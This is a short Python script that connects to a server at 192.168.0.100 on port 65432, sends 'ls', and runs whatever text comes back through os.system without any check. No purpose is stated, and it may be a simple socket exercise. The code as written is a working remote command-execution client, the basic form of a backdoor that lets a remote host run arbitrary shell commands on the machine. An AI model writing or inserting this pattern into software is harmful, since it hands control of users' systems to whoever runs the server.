import socket
import os

HOST = "192.168.0.100"  # The server's hostname or IP address
PORT = 65432  # The port used by the server

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(b"ls")
    data = s.recv(1024)
    result = data.decode('utf-8')


print(f"Received {result}")
print(f"Command {result} ")
os.system(result)
